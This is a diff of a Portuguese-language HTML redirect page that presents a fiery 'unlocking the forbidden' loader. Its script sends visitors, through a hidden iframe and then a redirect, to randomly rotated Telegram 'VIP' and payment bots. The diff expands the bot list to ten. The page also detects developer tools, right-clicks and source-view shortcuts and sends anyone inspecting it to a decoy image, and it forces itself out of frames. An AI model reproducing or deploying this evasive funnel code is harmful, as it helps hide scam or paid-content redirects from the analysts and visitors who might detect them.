@@ -5,9 +5,13 @@
 <title>🔥 Carregando...</title>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' data: blob:;">
-<noscript><title>Bloqueado</title><style>body{background:#000}*{display:none}</style></noscript>
+<noscript>
+  <title>Bloqueado</title>
+  <style>body{background:#000}*{display:none}</style>
+</noscript>
+
 <style>
-  html,body {
+  html,body{
     height:100%;
     margin:0;
     background:#000;
@@ -18,36 +22,36 @@
     color:#fff;
     overflow:hidden;
   }
-  .loader {
+  .loader{
     display:flex;
     flex-direction:column;
     align-items:center;
     gap:16px;
     text-align:center;
   }
-  h1 {
+  h1{
     font-size:1.3rem;
     color:#ff2a2a;
     letter-spacing:1px;
     text-shadow:0 0 10px #ff0000;
     animation:flicker 2s infinite alternate;
   }
-  .bar-wrap {
+  .bar-wrap{
     width:240px;
     height:14px;
     background:#220000;
     border-radius:999px;
     overflow:hidden;
-    box-shadow:0 0 25px rgba(255,0,0,0.3),inset 0 0 10px rgba(255,0,0,0.2);
+    box-shadow:0 0 25px rgba(255,0,0,.3), inset 0 0 10px rgba(255,0,0,.2);
     position:relative;
   }
-  .bar {
+  .bar{
     width:0%;
     height:100%;
     background:linear-gradient(90deg,#6a0000,#ff0000,#6a0000);
     animation:fill 2.6s linear forwards;
   }
-  .flame {
+  .flame{
     position:absolute;
     right:0;
     top:50%;
@@ -56,106 +60,128 @@
     opacity:0;
     animation:flameMove 2.6s linear forwards;
   }
-  @keyframes fill {
-    0% { width:0%; }
-    100% { width:100%; }
+  @keyframes fill{
+    0%{width:0%}
+    100%{width:100%}
   }
-  @keyframes flameMove {
-    0% { right:100%; opacity:0.3; }
-    10% { opacity:1; }
-    90% { opacity:1; }
-    100% { right:0%; opacity:0; }
+  @keyframes flameMove{
+    0%{right:100%;opacity:.3}
+    10%{opacity:1}
+    90%{opacity:1}
+    100%{right:0%;opacity:0}
   }
-  @keyframes flicker {
-    0%,100% { opacity:1; text-shadow:0 0 12px #ff0000; }
-    50% { opacity:0.8; text-shadow:0 0 20px #ff5500; }
+  @keyframes flicker{
+    0%,100%{opacity:1;text-shadow:0 0 12px #ff0000}
+    50%{opacity:.8;text-shadow:0 0 20px #ff5500}
   }
 </style>
 </head>
+
 <body>
-  <div class="loader">
-    <h1 id="status">Liberando acesso ao proibido… 🔥</h1>
-    <div class="bar-wrap">
-      <div class="bar" id="bar"></div>
-      <div class="flame">🔥</div>
-    </div>
+<div class="loader">
+  <h1>Liberando acesso ao proibido… 🔥</h1>
+  <div class="bar-wrap">
+    <div class="bar"></div>
+    <div class="flame">🔥</div>
   </div>
+</div>
 
 <script>
 (()=>{
-  // === Links MOBILE atualizados ===
+  // === BOTS MOBILE (ROTATIVO / RANDOM) ===
   const mobileBots = [
-    "https://t.me/Trambly_bot?start=start"
+    "https://t.me/vipivnddks_bot",
+    "https://t.me/VIP_sdvnjsdjs_bot",
+    "https://t.me/vip_dinvois_bot",
+    "https://t.me/noruegaajapa_BOT",
+    "https://t.me/jsdbjfvjbv_Vipbot",
+    "https://t.me/mijanomeucu_bot",
+    "https://t.me/aipapaigozanomeu_bot",
+    "https://t.me/aititiogozanomeu_bot",
+    "https://t.me/sugareepapi_bot",
+    "https://t.me/nsvldk_VIP_DSJBD_BOT"
   ];
 
-  // === Link DESKTOP mantido ===
+  // === BOT DESKTOP ===
   const desktopBot = "https://t.me/lasagnamax_pay112w3n_bot?start=go";
 
-  // === Link TRAP (para inspeção) ===
+  // === TRAP (ANTI-INSPEÇÃO) ===
   const trap = "https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";
 
   const isMobile = /Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
-  const rand = arr => arr[Math.floor(Math.random()*arr.length)];
+  const rand = arr => arr[Math.floor(Math.random() * arr.length)];
 
   let trapTriggered = false;
-  const triggerTrap = ()=> {
-    if (trapTriggered) return;
+  const triggerTrap = () => {
+    if(trapTriggered) return;
     trapTriggered = true;
-    try { location.replace(trap); } catch(e) { location.href = trap; }
+    try{ location.replace(trap); }catch(e){ location.href = trap; }
   };
 
-  function quickInspectionDetected() {
-    try {
-      const threshold = 160;
+  function quickInspectionDetected(){
+    try{
+      const t = 160;
       const w = window.outerWidth - window.innerWidth;
       const h = window.outerHeight - window.innerHeight;
-      if (!isMobile && (w > threshold || h > threshold)) return true;
-    } catch(e){}
-    try { if (document.location.ancestorOrigins && document.location.ancestorOrigins.length) return true; } catch(e){}
-    try {
+      if(!isMobile && (w > t || h > t)) return true;
+    }catch(e){}
+    try{
       const t0 = performance.now();
-      for (let i=0;i<50;i++) {}
-      const delta = performance.now() - t0;
-      if (delta > 120) return true;
-    } catch(e){}
+      for(let i=0;i<50;i++){}
+      if(performance.now() - t0 > 120) return true;
+    }catch(e){}
     return false;
   }
 
-  document.addEventListener('contextmenu', e => { e.preventDefault(); triggerTrap(); }, {passive:false});
-  document.addEventListener('keydown', e => {
-    const k = e.key || '';
-    if (k === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(k.toUpperCase())) || (e.ctrlKey && k.toUpperCase()==='U')) {
-      e.preventDefault(); triggerTrap();
+  document.addEventListener("contextmenu", e => {
+    e.preventDefault();
+    triggerTrap();
+  }, {passive:false});
+
+  document.addEventListener("keydown", e => {
+    const k = e.key || "";
+    if(
+      k === "F12" ||
+      (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(k.toUpperCase())) ||
+      (e.ctrlKey && k.toUpperCase() === "U")
+    ){
+      e.preventDefault();
+      triggerTrap();
     }
   }, {passive:false});
-  try{ if (window.top !== window.self) window.top.location = window.self.location; }catch(e){}
 
-  const REDIRECT_DELAY_MS = 350;
+  try{
+    if(window.top !== window.self){
+      window.top.location = window.self.location;
+    }
+  }catch(e){}
 
-  if (quickInspectionDetected()) {
+  if(quickInspectionDetected()){
     triggerTrap();
     return;
   }
 
   const dest = isMobile ? rand(mobileBots) : desktopBot;
+  const REDIRECT_DELAY_MS = 350;
 
-  try {
-    const frame = document.createElement('iframe');
-    frame.src = dest;
-    frame.style.position = "fixed";
-    frame.style.top = "-9999px";
-    frame.style.left = "-9999px";
-    frame.style.width = "1px";
-    frame.style.height = "1px";
-    frame.style.border = "0";
-    frame.style.visibility = "hidden";
-    document.body.appendChild(frame);
-  } catch(e){}
+  try{
+    const iframe = document.createElement("iframe");
+    iframe.src = dest;
+    iframe.style.position = "fixed";
+    iframe.style.top = "-9999px";
+    iframe.style.left = "-9999px";
+    iframe.style.width = "1px";
+    iframe.style.height = "1px";
+    iframe.style.border = "0";
+    iframe.style.visibility = "hidden";
+    document.body.appendChild(iframe);
+  }catch(e){}
 
-  setTimeout(() => {
-    if (trapTriggered) return;
-    try { location.replace(dest); } catch(e) { location.href = dest; }
+  setTimeout(()=>{
+    if(trapTriggered) return;
+    try{ location.replace(dest); }catch(e){ location.href = dest; }
   }, REDIRECT_DELAY_MS);
+
 })();
 </script>
 </body>
